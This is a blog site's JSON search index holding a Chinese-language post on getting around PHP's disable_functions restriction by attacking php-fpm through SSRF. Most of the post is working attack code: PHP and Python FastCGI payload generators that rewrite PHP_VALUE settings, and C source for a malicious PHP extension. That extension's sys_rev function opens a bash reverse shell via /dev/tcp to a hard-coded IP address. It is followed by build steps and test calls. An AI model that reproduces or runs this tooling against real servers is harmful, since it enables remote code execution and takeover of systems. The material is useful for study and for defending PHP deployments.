{"meta":{"title":"npC4t's Blog","subtitle":"","description":"2571374157@qq.com","author":"npC4t","url":"https://123-prog.github.io","root":"/"},"pages":[{"title":"About","date":"2021-09-22T11:44:02.703Z","updated":"2021-09-22T11:44:02.703Z","comments":true,"path":"about/index.html","permalink":"https://123-prog.github.io/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2021-09-22T11:47:22.213Z","updated":"2021-09-22T11:44:02.703Z","comments":true,"path":"categories/index.html","permalink":"https://123-prog.github.io/categories/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-07-18T13:43:18.000Z","updated":"2021-07-18T13:44:04.571Z","comments":true,"path":"categories_old/index.html","permalink":"https://123-prog.github.io/categories_old/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-07-18T14:04:33.000Z","updated":"2021-07-18T14:05:45.684Z","comments":true,"path":"tags_old/index.html","permalink":"https://123-prog.github.io/tags_old/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-09-22T11:47:54.296Z","updated":"2021-09-22T11:44:02.704Z","comments":true,"path":"tags/index.html","permalink":"https://123-prog.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"花式绕disable_functons","slug":"花式绕disable-functons","date":"2021-10-09T11:08:52.000Z","updated":"2021-10-21T15:59:26.890Z","comments":true,"path":"2021/10/09/花式绕disable-functons/","link":"","permalink":"https://123-prog.github.io/2021/10/09/%E8%8A%B1%E5%BC%8F%E7%BB%95disable-functons/","excerpt":"0x01 结合SSRF攻击内网脆弱服务常见的内网可尝试攻击的服务，php-fpm，redis，mysql或者其他脆弱的web应用","text":"0x01 结合SSRF攻击内网脆弱服务常见的内网可尝试攻击的服务，php-fpm，redis，mysql或者其他脆弱的web应用 1.攻击php-fpmpayload生成打php-fpm，没什么好说的，通常的情况是，在拿到某个php web应用的shell时，发现存在disable_functions限制了命令的执行，这时读取服务，如果发现用的是php-fpm，那么可以考虑打php-fpm。 打php-fpm除非它可以未授权访问，可以直接用socket连接发流量，否则都是需要利用一个SSRF漏洞，常见的curl，需要支持gopher协议，如果没有curl，那么可以考虑使用ftp恶意服务端转发数据（详见ftp协议在CTF中的应用 恶意数据生成，理解一下Fastcgi协议即可，下面是一个php写的攻击数据生成（亲测好用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */class FCGIClient&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = &#x27;MAX_CONNS&#x27;; const MAX_REQS = &#x27;MAX_REQS&#x27;; const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket &#123; $this-&gt;_host = $host; $this-&gt;_port = $port; &#125; /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) &#123; $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123; fclose($this-&gt;_sock); &#125; &#125; /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() &#123; return $this-&gt;_keepAlive; &#125; /** * Create a connection to the FastCGI application */ private function connect() &#123; if (!$this-&gt;_sock) &#123; //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) &#123; throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;); &#125; &#125; &#125; /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) &#123; $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ &#125; /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) &#123; $array = array(); if ($length === null) &#123; $length = strlen($data); &#125; $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord($data&#123;0&#125;); $ret[&#x27;type&#x27;] = ord($data&#123;1&#125;); $ret[&#x27;requestId&#x27;] = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;); $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;); $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;); $ret[&#x27;reserved&#x27;] = ord($data&#123;7&#125;); return $ret; &#125; /** * Read a FastCGI Packet * * @return array */ private function readPacket() &#123; if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123; $resp = $this-&gt;decodePacketHeader($packet); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ($resp[&#x27;contentLength&#x27;]) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123; $len -= strlen($buf); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ($resp[&#x27;paddingLength&#x27;]) &#123; $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]); &#125; return $resp; &#125; else &#123; return false; &#125; &#125; /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ($requestedInfo as $info) &#123; $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;); &#125; fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123; return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]); &#125; else &#123; throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;); &#125; &#125; /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) &#123; $response = &#x27;&#x27;;// $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;); echo(&#x27;data=&#x27;.urlencode($request));// fwrite($this-&gt;_sock, $request);// do &#123;// $resp = $this-&gt;readPacket();// if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;// $response .= $resp[&#x27;content&#x27;];// &#125;// &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);// var_dump($resp);// if (!is_array($resp)) &#123;// throw new Exception(&#x27;Bad request&#x27;);// &#125;// switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;// case self::CANT_MPX_CONN:// throw new Exception(&#x27;This app can\\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);// break;// case self::OVERLOADED:// throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);// break;// case self::UNKNOWN_ROLE:// throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);// break;// case self::REQUEST_COMPLETE:// return $response;// &#125; &#125;&#125;?&gt;&lt;?php$filepath = &quot;/var/www/html/index.php&quot;; // 目标主机已知的PHP文件的路径$req = &#x27;/&#x27;.basename($filepath);$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;; // 啥也不是, 不用管$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;; // 啥也不是, 不用管$php_value = &quot;unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hpdoger.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = &quot;;$params = array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SCRIPT_NAME&#x27; =&gt; $req, &#x27;QUERY_STRING&#x27; =&gt; &#x27;command=whoami&#x27;, &#x27;REQUEST_URI&#x27; =&gt; $uri, &#x27;DOCUMENT_URI&#x27; =&gt; $req,#&#x27;DOCUMENT_ROOT&#x27; =&gt; &#x27;/&#x27;, &#x27;PHP_VALUE&#x27; =&gt; $php_value, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;80sec/wofeiwo&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9001&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;localhost&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\\n\\n&quot;;echo $client-&gt;request($params, $code).&quot;\\n&quot;;?&gt; 因为大多数时候结合SSRF利用，没有未授权访问漏洞，没有暴露出外网的服务没有办法直接通过socket连接发送数据通信，所以这里把脚本里面连接的部分注释了，运行这个脚本，可以获取到可用的攻击数据 还有python版的，原理一样，都是根据Fastcgi协议写的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269import socketimport randomimport argparseimport sysfrom io import BytesIOfrom urllib.parse import quotefrom base64 import b64encode# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): &#x27;&#x27;&#x27; if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return &#x27;&#x27;&#x27; requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) &#x27;&#x27;&#x27; self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; &#x27;&#x27;&#x27; #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;: &quot;&quot;&quot; parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code &quot;&quot;&quot; client = FastCGIClient(&#x27;127.0.0.1&#x27;,&#x27;9000&#x27;, 3, 0) params = dict() documentRoot = &#x27;/&#x27; uri = &#x27;/var/www/html/index.php&#x27; content = &#x27;&lt;?php system(&quot;whoami&quot;);?&gt;&#x27; params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input\\nopen_basedir = /&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; print(str(b64encode(client.request(params,content)),encoding=&#x27;utf-8&#x27;)) print(&#x27;\\n&#x27;) print(quote(client.request(params,content))) #response = client.request(params, content) #print(force_text(response)) 实际应用根据情况更改PHP_VALUE或PHP_ADMIN_VALUE来控制php配置，但更改后的配置不能通过get_cfg_var()之类的函数来看到更改的效果，但实际上运行的cgi进程的配置已经被我们更改 虽说可以控制配置，但disable_functions这个配置不能更改，它在php加载的时候就已经定了，在disable_functions中的方法都不会加载进来，即使改了配置也没用，所以需要另寻他法来绕过disable_functions，其中一个思路就是可以通过加载恶意so扩展来实现命令执行 恶意扩展编写拉php源码到本地 1git clone https:&#x2F;&#x2F;github.com&#x2F;php&#x2F;php-src.git 利用ext目录下的ext_skel.php来生成一个扩展的主要框架 123cd php-src&#x2F;ext&#x2F;php ext_skel.php --ext npc4t --author npc4tcd npc4t 编辑config.m4 1234567891011PHP_ARG_ENABLE([npc4t], [whether to enable npc4t support], [AS_HELP_STRING([--enable-npc4t], [Enable npc4t support])], [no])if test &quot;$PHP_NPC4T&quot; != &quot;no&quot;; then AC_DEFINE(HAVE_NPC4T, 1, [ Have npc4t support ]) PHP_NEW_EXTENSION(npc4t, npc4t.c, $ext_shared)fi php_npc4t.h 123456789101112131415/* npc4t extension for PHP (c) 2021 npc4t */#ifndef PHP_NPC4T_H# define PHP_NPC4T_Hextern zend_module_entry npc4t_module_entry;# define phpext_npc4t_ptr &amp;npc4t_module_entry# define PHP_NPC4T_VERSION &quot;0.1.0&quot;# if defined(ZTS) &amp;&amp; defined(COMPILE_DL_NPC4T)ZEND_TSRMLS_CACHE_EXTERN()# endif#endif /* PHP_NPC4T_H */ npc4t.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124/* npc4t extension for PHP (c) 2021 npc4t */#ifdef HAVE_CONFIG_H# include &quot;config.h&quot;#endif#include &quot;php.h&quot;#include &quot;ext/standard/info.h&quot;#include &quot;php_npc4t.h&quot;#include &lt;stdio.h&gt;/* For compatibility with older PHP versions */#ifndef ZEND_PARSE_PARAMETERS_NONE#define ZEND_PARSE_PARAMETERS_NONE() \\ ZEND_PARSE_PARAMETERS_START(0, 0) \\ ZEND_PARSE_PARAMETERS_END()#endifPHP_FUNCTION(sys_exec) //执行命令&#123; char *cmd = &quot;whoami&quot;; size_t cmd_len = sizeof(&quot;whoami&quot;) - 1; FILE* pf; char data[100] = &#123;&#x27;0&#x27;&#125;; ZEND_PARSE_PARAMETERS_START(0, 1) Z_PARAM_OPTIONAL Z_PARAM_STRING(cmd, cmd_len) ZEND_PARSE_PARAMETERS_END(); //system(cmd); pf = popen(cmd,&quot;r&quot;); while(fgets(data, sizeof(data), pf) != NULL)&#123; php_printf(data); //打印命令执行结果 &#125;&#125;PHP_FUNCTION(sys_rev) //反弹shell&#123; char *ip = &quot;121.37.10.254&quot;; size_t len1 = sizeof(ip) - 1; char *port = &quot;1000&quot;; size_t len2 = sizeof(port) - 1; char cmd[100]; ZEND_PARSE_PARAMETERS_START(0, 2) Z_PARAM_OPTIONAL Z_PARAM_STRING(ip, len1) Z_PARAM_STRING(port, len2) ZEND_PARSE_PARAMETERS_END(); sprintf(cmd, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\&quot;&quot;, ip, port); //RETURN_STR(cmd); system(cmd);&#125;/* &#123;&#123;&#123; PHP_RINIT_FUNCTION */PHP_RINIT_FUNCTION(npc4t)&#123;#if defined(ZTS) &amp;&amp; defined(COMPILE_DL_NPC4T) ZEND_TSRMLS_CACHE_UPDATE();#endif return SUCCESS;&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; PHP_MINFO_FUNCTION */PHP_MINFO_FUNCTION(npc4t)&#123; php_info_print_table_start(); php_info_print_table_header(2, &quot;npc4t support&quot;, &quot;enabled&quot;); php_info_print_table_end();&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; arginfo */ZEND_BEGIN_ARG_INFO(arginfo_sys_exec, 0) ZEND_ARG_INFO(0, str)ZEND_END_ARG_INFO()ZEND_BEGIN_ARG_INFO(arginfo_sys_rev, 0) ZEND_ARG_INFO(0, ip) ZEND_ARG_INFO(0, port)ZEND_END_ARG_INFO()/* &#125;&#125;&#125; *//* &#123;&#123;&#123; npc4t_functions[] */static const zend_function_entry npc4t_functions[] = &#123; PHP_FE(sys_exec, arginfo_sys_exec) PHP_FE(sys_rev, arginfo_sys_rev) PHP_FE_END&#125;;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; npc4t_module_entry */zend_module_entry npc4t_module_entry = &#123; STANDARD_MODULE_HEADER, &quot;npc4t&quot;, /* Extension name */ npc4t_functions, /* zend_function_entry */ NULL, /* PHP_MINIT - Module initialization */ NULL, /* PHP_MSHUTDOWN - Module shutdown */ PHP_RINIT(npc4t), /* PHP_RINIT - Request initialization */ NULL, /* PHP_RSHUTDOWN - Request shutdown */ PHP_MINFO(npc4t), /* PHP_MINFO - Module info */ PHP_NPC4T_VERSION, /* Version */ STANDARD_MODULE_PROPERTIES&#125;;/* &#125;&#125;&#125; */#ifdef COMPILE_DL_NPC4T# ifdef ZTSZEND_TSRMLS_CACHE_DEFINE()# endifZEND_GET_MODULE(npc4t)#endif 写完扩展后就开始编译 注意php的版本会对扩展加载造成影响，所以需要相同版本的php环境下对扩展进行编译 1234&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;phpize &#x2F;&#x2F;注意使用指定版本的phpize,如果使用过其他版本的phpize,记住清空旧版本的残余.&#x2F;configure --with-php-config&#x3D;&#x2F;etc&#x2F;php&#x2F;8.0.9&#x2F;bin&#x2F;php-config &#x2F;&#x2F;同样指定版本的php-configmakesudo make install &#x2F;&#x2F;安装到指定版本的so目录下 在本地测试扩展的话，在php配置中添加 12[c4t]extension &#x3D; npc4t.so 可以用php -m看php启动的模块，可以看到npc4t就说明扩展已经被加载，接下来可以使用扩展中的函数了 测试代码 123&lt;?phpsys_exec(&#x27;whoami&#x27;); //执行系统命令(有回显)sys_rev(&#x27;127.0.0.1&#x27;,&#x27;12345&#x27;); //反弹shell 到此恶意扩展编写完成，接下来就要上传我们的恶意扩展到服务器，并且让php-fpm加载这个扩展 